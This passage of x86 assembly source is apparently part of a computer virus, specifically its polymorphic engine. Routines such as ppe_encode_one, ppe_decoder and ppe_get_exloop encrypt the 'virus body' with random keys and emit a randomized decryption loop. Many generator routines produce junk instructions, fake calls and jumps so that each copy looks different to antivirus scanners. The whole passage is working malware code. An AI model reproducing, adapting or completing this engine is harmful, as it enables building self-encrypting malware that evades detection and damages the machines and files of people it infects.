           movzx   ebx,byte ptr [ebp+index_reg_place-virus_start]
           cmp byte ptr [ebp+index_reg-virus_start],0
           jz  __ppe_gi_nr_finish
           push    eax
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           movzx   ebx,al
           pop eax
       __ppe_gi_nr_finish:
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+ebx*02h-virus_start]
           call    __copro_fix_delta

           ; where I have save a index_reg ? base/copro/mmx ?
           cmp byte ptr [ebp+index_reg-virus_start],0
           jz  __ppe_gi_finish
           cmp byte ptr [ebp+index_reg-virus_start],1
           jz  __ppe_gi_copro

           ; put value from b-reg to mmx-reg & copro-reg
           mov ah,byte ptr [ebx]
           mov al,byte ptr [ebp+index_reg_place-virus_start]
           mov bx,0002h
           call    ppe_math_extended
           jmp __ppe_gi_finish

       __ppe_gi_copro:
           ; mov b-reg32 to copro
           mov ah,byte ptr [ebx]
           mov al,byte ptr [ebp+index_reg_place-virus_start]
           call    __copro_reg2mov

       __ppe_gi_finish:
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov byte ptr [ebp+index_reg_get-virus_start],01h
           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ generate code to set code value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_get_code:
           ; save registers
           pusha
           call    gen_garbage

           ; get random code to base
           mov eax,[ebp+code_value-virus_start]
           movzx   ebx,byte ptr [ebp+code_reg_place-virus_start]
           call    ppe_crypt_value

           ; wow, very easy function...
           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ generate code to set counter random-value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_get_counter:

           ; save registers
           pusha
           call    gen_garbage

           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; get a random counter
           call    ppe_get_rnd32
           mov [ebp+counter_value-virus_start],eax
           mov [ebp+counter_vfinish-virus_start],eax
           add dword ptr [ebp+counter_vfinish-virus_start],file_size / 04h
           movzx   ebx,byte ptr [ebp+counter_reg_place-virus_start]
           cmp byte ptr [ebp+counter_reg-virus_start],0
           jz  __ppe_gcount_nr_finish
           push    eax
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           movzx   ebx,al
           pop eax
       __ppe_gcount_nr_finish:
           call    ppe_crypt_value
           lea ebx,[ebp+tbl_regs+ebx*02h-virus_start]

           ; move to base or copro/mmx ?
           cmp byte ptr [ebp+counter_reg-virus_start],0
           jz  __ppe_gcount_finish
           cmp byte ptr [ebp+counter_reg-virus_start],1
           jz  __ppe_gcount_copro

           ; move to mmx-reg & copro-reg
           mov ah,byte ptr [ebx]
           mov al,byte ptr [ebp+counter_reg_place-virus_start]
           mov bx,0002h
           call    ppe_math_extended
           jmp __ppe_gcount_finish

       __ppe_gcount_copro:
           ; move to copro-reg
           mov ah,byte ptr [ebx]
           mov al,byte ptr [ebp+counter_reg_place-virus_start]
           call    __copro_reg2mov

       __ppe_gcount_finish:
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ generate encrypted body of this virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_encode_one:

           ; save registers
           pusha

           ; select style (add/sub/xor)
           mov eax,00000003h
           call    ppe_get_rnd_range
           mov [ebp+crypt_style-virus_start],al

           ; generate a code value
           call    ppe_get_rnd32
           mov [ebp+code_value_add-virus_start],eax
           call    ppe_get_rnd32
           mov [ebp+code_value-virus_start],eax

           ; preparing...
           mov esi,[ebp+mem_address-virus_start]
           add esi,file_size
           mov ecx,file_size / 04h
           mov ebx,[ebp+code_value-virus_start]
           mov edx,[ebp+code_value_add-virus_start]

       __ppe_eo_coding:
           sub esi,4
           mov eax,[esi]

           ; I must select style of encoding...
           cmp byte ptr [ebp+crypt_style-virus_start],2
           jz  __ppe_eo_xor
           cmp byte ptr [ebp+crypt_style-virus_start],1
           jz  __ppe_eo_sub
           add eax,ebx
           jmp __ppe_eo_next
       __ppe_eo_sub:
           sub eax,ebx
           jmp __ppe_eo_next
       __ppe_eo_xor:
           xor eax,ebx

       __ppe_eo_next:
           mov [esi],eax
           sub ebx,edx
           dec ecx
           jnz __ppe_eo_coding

           ; save new values
           add ebx,edx
           mov [ebp+code_value-virus_start],ebx

           ; change sub <--> add
           cmp byte ptr [ebp+crypt_style-virus_start],0
           jnz __ppe_eo_fsub
           not byte ptr [ebp+crypt_style-virus_start]
           neg byte ptr [ebp+crypt_style-virus_start]
           jmp __ppe_eo_finish
       __ppe_eo_fsub:
           cmp byte ptr [ebp+crypt_style-virus_start],1
           jnz __ppe_eo_finish
           neg byte ptr [ebp+crypt_style-virus_start]
           not byte ptr [ebp+crypt_style-virus_start]
       __ppe_eo_finish:
           popa
           ret

   ;ÄÄÄ´ function to build poly-decoder ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;
           ;
           __ppe_dindex_breg    db  ?
           __ppe_dcode_breg     db  ?
           ;
   ppe_decoder:

           ; save registers
           pusha

           ; save used-regs
           mov al,byte ptr [ebp+used_regs-virus_start]
           push    ax

           ; save this place in memory for the future JNZ jump
           mov [ebp+counter_back-virus_start],edi

           ;---- INDEX REG ----
           ; mov index_reg from copro/mmx if it's necessary
           lea ebx,[ebp+index_reg_place-virus_start]
           cmp byte ptr [ebp+index_reg-virus_start],0   ;base ?
           jz  __ppe_dindex_finish
       __ppe_dindex_new_reg:
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __ppe_dindex_new_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           cmp byte ptr [ebp+index_reg-virus_start],1   ;copro ?
           jz  __ppe_dindex_copro

           ; mov mmx-reg & copro-reg to base-empty-reg
           push    ebx
           mov ah,byte ptr [ebx]
           mov al,byte ptr [ebp+index_reg_place-virus_start]
           mov bx,0102h
           call    ppe_math_extended
           pop ebx
           jmp __ppe_dindex_finish
       __ppe_dindex_copro:
           ; mov copro-reg to base-empty-reg
           mov ah,byte ptr [ebx]
           mov al,byte ptr [ebp+index_reg_place-virus_start]
           call    __copro_mov2reg
       __ppe_dindex_finish:
           mov al,byte ptr [ebx]
           mov [ebp+__ppe_dindex_breg-virus_start],al
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah

           ;---- CODE REG ----
           lea ebx,[ebp+code_reg_place-virus_start]
           mov al,byte ptr [ebx]
           mov [ebp+__ppe_dcode_breg-virus_start],al
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah

           mov al,31h          ;XOR instruction
           cmp byte ptr [ebp+crypt_style-virus_start],2
           jz  __ppe_dcrypt_finish
           mov al,29h          ;SUB instruction
           cmp byte ptr [ebp+crypt_style-virus_start],1
           jz  __ppe_dcrypt_finish
           mov al,01h          ;ADD instruction
       __ppe_dcrypt_finish:
           mov ah,byte ptr [ebp+__ppe_dcode_breg-virus_start]
           shl ah,3
           or  ah,byte ptr [ebp+__ppe_dindex_breg-virus_start]
           stosw

           ; enable registers
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to select new index ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
           __ppe_gni_random    db  ?
   ppe_get_next_index:

           ; save registers
           pusha

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; add or sub ?
           call    ppe_get_rnd32
           and al,1
           mov [ebp+__ppe_gni_random-virus_start],al

           ; where I have index store ?
           cmp byte ptr [ebp+index_reg-virus_start],2
           jz  __ppe_gni_mmx
           cmp byte ptr [ebp+index_reg-virus_start],1
           jz  __ppe_gni_copro

           ; index_reg is in base-reg
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           mov bl,al
           cmp byte ptr [ebp+__ppe_gni_random-virus_start],1
           jz  __ppe_gni_b2

           mov al,04h
           movzx   eax,al
           call    ppe_crypt_value

           mov al,03h          ;ADD instruction
           __ppe_gni_b1_after:
           mov ah,[ebp+index_reg_place-virus_start]
           shl ah,3
           or  ah,bl
           or  ah,0C0h
           stosw
           jmp __ppe_gni_finish
           __ppe_gni_b2:
           mov al,0FCh
           movsx   eax,al
           call    ppe_crypt_value
           mov al,2Bh          ;SUB instruction
           jmp __ppe_gni_b1_after

           ; COPRO operation
       __ppe_gni_copro:
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov bl,al
           cmp byte ptr [ebp+__ppe_gni_random-virus_start],1
           jz  __ppe_gni_c2

           mov al,04h
           movzx   eax,al
           call    ppe_crypt_value

           lea esi,[ebp+tbl_copro_math+02h-virus_start]  ;FIADD dw
           __ppe_gni_c1_after:
           mov ah,bl
           call    ppe_reg2mem     ;EDX is output
           mov al,[ebp+index_reg_place-virus_start]
           call    c_copro_math
           jmp __ppe_gni_finish

           __ppe_gni_c2:
           mov al,0FCh
           movsx   eax,al
           call    ppe_crypt_value
           lea esi,[ebp+tbl_copro_math+06h-virus_start]  ;FISUB dw
           jmp __ppe_gni_c1_after

           ; MMX operation
       __ppe_gni_mmx:
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov bl,al
           cmp byte ptr [ebp+__ppe_gni_random-virus_start],1
           jz  __ppe_gni_m2

           ; genarete number -4- to an empty b-reg32
           mov al,04h
           movzx   eax,al
           call    ppe_crypt_value

           mov ah,bl
           mov bl,0            ;PADDD operation
           __ppe_gni_m1_after:
           mov al,[ebp+index_reg_place-virus_start]
           call    ppe_math_extended
           jmp __ppe_gni_finish

           __ppe_gni_m2:
           mov al,0FCh
           movsx   eax,al
           call    ppe_crypt_value
           mov ah,bl
           mov bl,1            ;PSUBD operation
           jmp __ppe_gni_m1_after

       __ppe_gni_finish:
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to select new code-value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
           __ppe_gnc_random    db  ?
   ppe_get_next_code:

           ; save registers
           pusha

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; add or sub ?
           call    ppe_get_rnd32
           and al,1
           mov byte ptr [ebp+__ppe_gnc_random-virus_start],al

           ; base operations
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov bl,al
           mov eax,[ebp+code_value_add-virus_start]
           cmp byte ptr [ebp+__ppe_gnc_random-virus_start],1
           jz  __ppe_gnc_b2
           call    ppe_crypt_value

           mov al,03h          ;ADD operation
           __ppe_gnc_b1_after:
           mov ah,[ebp+code_reg_place-virus_start]
           shl ah,3
           or  ah,bl
           or  ah,0C0h
           stosw
           jmp __ppe_gnc_finish
           __ppe_gnc_b2:
           neg eax
           call    ppe_crypt_value
           mov al,2Bh          ;SUB operation
           jmp __ppe_gnc_b1_after

       __ppe_gnc_finish:
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to select next counter ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
           __ppe_gncounter_random  db  ?
   ppe_get_next_counter:

           ; save registers
           pusha

           ; save used-regs
           mov al,byte ptr [ebp+used_regs-virus_start]
           push    ax

           ; add or sub ?
           call    ppe_get_rnd32
           and al,1
           mov [ebp+__ppe_gncounter_random-virus_start],al

           ; type of operation
           cmp byte ptr [ebp+counter_reg-virus_start],2
           jz  __ppe_gncounter_mmx
           cmp byte ptr [ebp+counter_reg-virus_start],1
           jz  __ppe_gncounter_copro

           ;counter_reg is in b-reg32
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           mov bl,al
           cmp byte ptr [ebp+__ppe_gncounter_random-virus_start],1
           jz  __ppe_gncounter_b2

           mov al,01h
           movzx   eax,al
           call    ppe_crypt_value

           mov al,03h          ;ADD instruction
           __ppe_gncounter_b1_after:
           mov ah,[ebp+counter_reg_place-virus_start]
           shl ah,3
           or  ah,bl
           or  ah,0C0h
           stosw
           jmp __ppe_gncounter_finish
           __ppe_gncounter_b2:
           mov al,0FFh
           movsx   eax,al
           call    ppe_crypt_value
           mov al,2Bh          ;SUB instruction
           jmp __ppe_gncounter_b1_after

       __ppe_gncounter_copro:
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           mov bl,al
           cmp byte ptr [ebp+__ppe_gncounter_random-virus_start],1
           jz  __ppe_gncounter_c2

           mov al,01h
           movzx   eax,al
           call    ppe_crypt_value

           lea esi,[ebp+tbl_copro_math+02h-virus_start]  ;FIADD dw
           __ppe_gncounter_c1_after:
           mov ah,bl
           call    ppe_reg2mem     ;EDX is output
           mov al,[ebp+counter_reg_place-virus_start]
           call    c_copro_math
           jmp __ppe_gncounter_finish

           __ppe_gncounter_c2:
           mov al,0FFh
           movsx   eax,al
           call    ppe_crypt_value
           lea esi,[ebp+tbl_copro_math+06h-virus_start]  ;FISUB dw
           jmp __ppe_gncounter_c1_after

           ; MMX operation
       __ppe_gncounter_mmx:
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           mov bl,al
           cmp byte ptr [ebp+__ppe_gncounter_random-virus_start],1
           jz  __ppe_gncounter_m2

           mov al,01h
           movzx   eax,al
           call    ppe_crypt_value

           mov ah,bl
           mov bl,0            ;PADDD operation
           __ppe_gncounter_m1_after:
           mov al,[ebp+counter_reg_place-virus_start]
           call    ppe_math_extended
           jmp __ppe_gncounter_finish

           __ppe_gncounter_m2:
           mov al,0FFh
           movsx   eax,al
           call    ppe_crypt_value
           mov ah,bl
           mov bl,1            ;PSUBD operation
           jmp __ppe_gncounter_m1_after

       __ppe_gncounter_finish:
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to generate decoder-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_get_exloop:

           ; save registers
           pusha

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; where's counter store ?
           cmp byte ptr [ebp+counter_reg-virus_start],2
           jz  __ppe_ge_mmx
           cmp byte ptr [ebp+counter_reg-virus_start],1
           jz  __ppe_ge_copro

           mov bl,[ebp+counter_reg_place-virus_start]
           jmp __ppe_ge_bfinish

       __ppe_ge_copro:
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           mov bl,al
           mov ah,al
           mov al,[ebp+counter_reg_place-virus_start]
           call    __copro_mov2reg
           jmp __ppe_ge_bfinish

       __ppe_ge_mmx:
           ; we must mov counter-mmx-reg & c-copro-reg to b-reg32
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           push    ax
           mov ah,al
           mov al,[ebp+counter_reg_place-virus_start]
           mov bx,0102h
           call    ppe_math_extended
           pop bx

       __ppe_ge_bfinish:
           push    bx
           call    ppe_get_empty_reg
           mov bl,al
           mov eax,[ebp+counter_vfinish-virus_start]
           call    ppe_crypt_value
           pop ax
           shl al,3
           or  al,bl
           or  al,0C0h
           mov ah,3Bh          ;CMP instruction
           xchg    ah,al
           stosw

           ; restore used-regs
           pop ax
           mov [ebp+used_regs-virus_start],al

           call    gen_garbage_no_flags

           mov ax,850Fh        ;JNZ..
           stosw

           mov eax,[ebp+counter_back-virus_start]
           sub eax,edi
           sub eax,4
           stosd

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to jump to decode-virus-body ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_get_return:

           ; save register
           pusha

           ; save used-regs
           movzx   eax,byte ptr [ebp+gl_index_reg-virus_start]
           call    __reg_to_bcd
           mov [ebp+used_regs-virus_start],ah

           ; remove flags from stack
           call    gen_garbage_no_flags
           call    ppe_get_empty_reg
           mov al,58h
           or  al,byte ptr [ebx]
           stosb
           call    gen_garbage_no_flags

           ; generate offset to jump back
           xor eax,eax
           mov ebx,file_size
           sub ebx,eax
           push    ebx

           ; ready to JMP there
           call    ppe_get_empty_reg
           pop eax
           dec eax
           not eax
           call    c_call_reg32        ;edi-2 = call reg32 instr
           mov eax,[ebp+g_cr32_jump-virus_start]
           add byte ptr [eax-1],10h    ;CALL reg32 --> JMP reg32

           ; generate final garbages
           mov eax,00000005h
           call    ppe_get_rnd_range
           add eax,00000005h
           mov ecx,eax
       __gr_final:
           call    gen_garbage
           loop    __gr_final

           ; restore registers
           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ generate one byte instruction that does not change regs ÃÄÄÄÄÄÄÄÄÄÄÄ

   gen_save_code:  mov eax,end_save_code-tbl_save_code
           call    ppe_get_rnd_range
           mov al,byte ptr [ebp+tbl_save_code+eax-virus_start]
           stosb
           ret

   ;ÄÄÄ´ generate mov reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_movreg32imm:  call    ppe_get_empty_reg   ;mov empty_reg32,imm
           mov al,0b8h
           or  al,byte ptr [ebx]
           stosb
           call    ppe_get_rnd32
           stosd
           ret

   g_movreg16imm:  call    ppe_get_empty_reg   ;mov empty_reg16,imm
           mov ax,0B866h
           or  ah,byte ptr [ebx]
           stosw
           call    ppe_get_rnd32
           stosw
           ret

   g_movreg8imm:   call    ppe_get_empty_reg   ;mov empty_reg8,imm
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz a_movreg8imm
           call    ppe_get_rnd32
           mov al,0B0h
           or  al,byte ptr [ebx]
           mov edx,eax
           call    ppe_get_rnd32
           and ax,0004h
           or  ax,dx
           stosw
   a_movreg8imm:   ret

   ;ÄÄÄ´ generate mov reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_movregreg32:  call    ppe_get_reg     ;mov empty_reg32,reg32
           push    ebx
           call    ppe_get_empty_reg
           pop edx
           cmp ebx,edx
           jz  g_movregreg32       ;mov ecx,ecx ? etc. ?
   c_movregreg32:  mov ah,byte ptr [ebx]
           shl ah,3
           or  ah,byte ptr [edx]
           or  ah,0C0h
           mov al,8Bh
           stosw
           ret

   g_movregreg16:  call    ppe_get_reg     ;mov empty_reg16,reg16
           push    ebx
           call    ppe_get_empty_reg
           pop edx
           cmp ebx,edx
           jz  g_movregreg16       ;mov si,si ? etc. ?
           mov al,66h
           stosb
           jmp c_movregreg32

   g_movregreg8:   call    ppe_get_reg     ;mov empty_reg8,reg8
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz g_movregreg8
           push    ebx
           call    ppe_get_empty_reg
           pop edx
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz a_movregreg8
           cmp ebx,edx
           jz  g_movregreg8        ;mov al,al ? etc. ?
           mov ah,byte ptr [ebx]
           shl ah,3
           or  ah,byte ptr [edx]
           or  ah,0C0h
           mov al,8Ah
           push    eax
           call    ppe_get_rnd32
           pop edx
           and ax,2400h
           or  ax,dx
           stosw
   a_movregreg8:   ret

   ;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_mathreg32imm: mov al,81h          ;math reg32,imm
           stosb
           call    ppe_get_empty_reg
           call    __do_math_work
           stosd
           ret

   g_mathreg16imm: mov ax,8166h        ;math reg16,imm
           stosw
           call    ppe_get_empty_reg
           call    __do_math_work
           stosw
           ret

   g_mathreg8imm:  call    ppe_get_empty_reg   ;math reg8,imm
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz a_mathreg8imm
           mov al,80h
           stosb
           call    __do_math_work
           stosb
           and ah,04h
           or  byte ptr [edi-2],ah
   a_mathreg8imm:  ret

       __do_math_work:             ;select math operation
           mov eax,end_math_imm - tbl_math_imm
           call    ppe_get_rnd_range
           lea esi,dword ptr [ebp+tbl_math_imm+eax-virus_start]
           lodsb
           or  al,byte ptr [ebx]
           stosb
           call    ppe_get_rnd32
           ret

   ;ÄÄÄ´ generate push reg + garbage + pop reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_push_g_pop:   call    ppe_get_reg     ;   push rnd_reg
           mov al,50h          ;   --garbage--
           or  al,byte ptr [ebx]   ;   --garbage--
           stosb               ;   pop empty_reg
           call    gen_garbage_based
           call    ppe_get_empty_reg
           mov al,58h
           or  al,byte ptr [ebx]
           stosb
           ret

   ;ÄÄÄ´ generate call without return ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_call_cont:    mov al,0E8h         ;   call    __here
           stosb               ;   --rnd data--
           push    edi         ;   --rnd data--
           stosd               ;__here:
           call    ppe_gen_rnd_block   ;   pop empty_reg
           pop edx
           mov eax,edi
           sub eax,edx
           sub eax,00000004h
           mov [edx],eax
           call    gen_garbage_no_flags
           call    ppe_get_empty_reg
           mov al,58h
           or  al,byte ptr [ebx]
           stosb
           ret

   ;ÄÄÄ´ generate unconditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_jump_u:   mov al,0E9h         ;   jmp __here
           stosb               ;   --rnd data--
           push    edi         ;   --rnd data--
           stosd               ;__here:
           call    ppe_gen_rnd_block   ;   --next code--
           pop edx
           mov eax,edi
           sub eax,edx
           sub eax,00000004h
           mov dword ptr [edx],eax
           ret

   ;ÄÄÄ´ generate conditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_jump_c:   call    ppe_get_rnd32       ;   jX __here
           and ah,0Fh          ;   --garbage--
           add ah,80h          ;   --garbage--
           mov al,0Fh          ;__here:
           stosw               ;   --next code--
           push    edi
           stosd
           call    gen_garbage_no_flags
           pop edx
           mov eax,edi
           sub eax,edx
           sub eax,00000004h
           mov dword ptr [edx],eax
           ret

   ;ÄÄÄ´ generate movzx,movsx reg32/16,reg16/8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_movzx_movsx_32:               ;movzx/movsx reg32,reg16
           call    ppe_get_rnd32
           mov ah,0B7h
           and al,1
           jz  __d_movzx32
           mov ah,0BFh
       __d_movzx32:
           mov al,0Fh
           stosw
           call    ppe_get_reg
           push    ebx
           call    ppe_get_empty_reg
           pop edx
           mov al,byte ptr [ebx]
           shl al,3
           or  al,0C0h
           or  al,byte ptr [edx]
           stosb
           ret

   g_movzx_movsx_16:               ;movzx/movsx reg16,reg8
           mov al,66h
           stosb

   g_movzx_movsx_8:                ;movzx/movsx reg32,reg8
           call    ppe_get_rnd32
           mov ah,0B6h
           and al,1
           jz  __d_movzx32
           mov ah,0BEh
           jmp __d_movzx32

   ;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_rotate_shift32:               ;(r/s) reg32,imm8
           mov al,0C1h
           stosb
           call    ppe_get_empty_reg
           call    __do_rs_work
           stosb
           ret

   g_rotate_shift16:               ;(r/s) reg16,imm8
           mov al,66h
           stosb
           jmp g_rotate_shift32

   g_rotate_shift8:
           call    ppe_get_empty_reg   ;(r/s) reg8,imm8
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz a_rotate_shift8
           mov al,0C0h
           stosb
           call    __do_rs_work
           stosb
           and ah,04h
           or  byte ptr [edi-2],ah
   a_rotate_shift8:ret

       __do_rs_work:               ;select r/s operation
           mov eax,end_rs_imm - tbl_rs_imm
           call    ppe_get_rnd_range
           lea esi,dword ptr [ebp+tbl_rs_imm+eax-virus_start]
           lodsb
           or  al,byte ptr [ebx]
           stosb
           call    ppe_get_rnd32
           ret

   ;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,reg8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_rs_reg32reg8:                 ;(r/s) reg32,reg8
           mov al,0D3h
           stosb               ;in fact, reg8 is always CL
           call    ppe_get_empty_reg   ;because CPU allows only
           call    __do_rs_work        ;this reg8
           ret

   g_rs_reg16reg8:                 ;(r/s) reg16,reg8 (CL)
           mov al,66h
           stosb
           jmp g_rs_reg32reg8

   g_rs_reg8reg8:                  ;(r/s) reg8,reg8 (CL)
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz a_rs_reg8reg8
           mov ax,0D266h
           stosw
           call    __do_rs_work
           and ah,04h
           or  byte ptr [edi-1],ah
   a_rs_reg8reg8:  ret

   ;ÄÄÄ´ generate bt/bts/btr/btc reg32/16,(reg/imm)32/16 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_bt_regreg32:  mov al,0Fh
           stosb
           call    __do_bt_work
           ret

   g_bt_regreg16:  mov ax,0F66h
           stosw
           call    __do_bt_work
           ret

       __do_bt_work:
           mov eax,end_bt_reg - tbl_bt_reg
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_bt_reg+eax-virus_start]
           lodsb
           stosb
           call    ppe_get_empty_reg
           push    ebx
           call    ppe_get_reg
           pop edx
           mov al,byte ptr [ebx]
           shl al,3
           or  al,0C0h
           or  al,byte ptr [edx]
           stosb
           ret

   g_bit_test32:   mov ax,0BA0Fh
           stosw
           call    __do_bit_test_work
           ret

   g_bit_test16:   mov al,66h
           stosb
           jmp g_bit_test32

       __do_bit_test_work:
           mov eax,end_bt_imm - tbl_bt_imm
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_bt_imm+eax-virus_start]
           call    ppe_get_empty_reg
           lodsb
           or  al,byte ptr [ebx]
           stosb
           call    ppe_get_rnd32
           stosb
           ret

   ;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_mathregreg32:                 ;math reg32,reg32
           call    __do_math_regreg_work
           ret

   g_mathregreg16:                 ;math reg16,reg16
           mov al,66h
           stosb
           jmp g_mathregreg32

   g_mathregreg8:                  ;math reg8,reg8
           call    ppe_get_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz g_mathregreg8
           push    ebx
           call    ppe_get_empty_reg
           pop edx
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz a_mathregreg8
           mov eax,end_math_reg - tbl_math_reg
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_math_reg+eax-virus_start]
           lodsb
           dec al
           stosb
           mov al,byte ptr [ebx]
           shl al,3
           or  al,byte ptr [edx]
           or  al,0C0h
           stosb
           call    ppe_get_rnd32
           and al,24h
           or  byte ptr [edi-1],al
   a_mathregreg8:  ret

       __do_math_regreg_work:
           mov eax,end_math_reg - tbl_math_reg
           call    ppe_get_rnd_range
           lea esi,[ebp+tbl_math_reg+eax-virus_start]
           lodsb
           stosb
           call    ppe_get_reg
           push    ebx
           call    ppe_get_empty_reg
           pop edx
           mov al,byte ptr [ebx]
           shl al,3
           or  al,0C0h
           or  al,byte ptr [edx]
           stosb
           ret

   ;ÄÄÄ´ set reg8 by flag ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_set_byte: call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
           jnz a_set_byte
           mov al,0Fh
           stosb
           mov eax,00000010h       ;we have 16 opcodes, haha..
           call    ppe_get_rnd_range
           or  al,90h          ;seta , setae, setb , setbe
           stosb               ;sete , setg , setge, setl
           mov al,byte ptr [ebx]   ;setle, setne, setno, setnp
           or  al,0C0h         ;setns, seto , setp , sets
           stosb
           call    ppe_get_rnd32
           and al,04h
           or  byte ptr [edi-1],al
   a_set_byte: ret

   ;ÄÄÄ´ generate garbage + loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   g_loop:

